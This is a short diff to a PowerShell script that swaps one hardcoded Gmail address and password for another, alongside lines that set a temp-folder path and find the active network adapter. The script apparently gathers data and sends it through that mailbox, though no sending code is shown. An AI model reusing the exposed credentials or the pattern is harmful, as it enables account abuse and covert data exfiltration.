@@ -27,8 +27,8 @@ $path = "$env:temp/$wd"
 $initial_dir = Get-Location
 
 # Load email and password from text files
-$email = "theedukkespallace@gmail.com"
-$pword = "jagxxeqhkigpeqor"
+$email = "goat3dmofo@gmail.com"
+$pword = "qcihadixhgspywjw"
 
 # Retrieve the correct network interface alias
 $interfaceAlias = (Get-NetAdapter | Where-Object { $_.Status -eq 'Up' }).InterfaceAlias
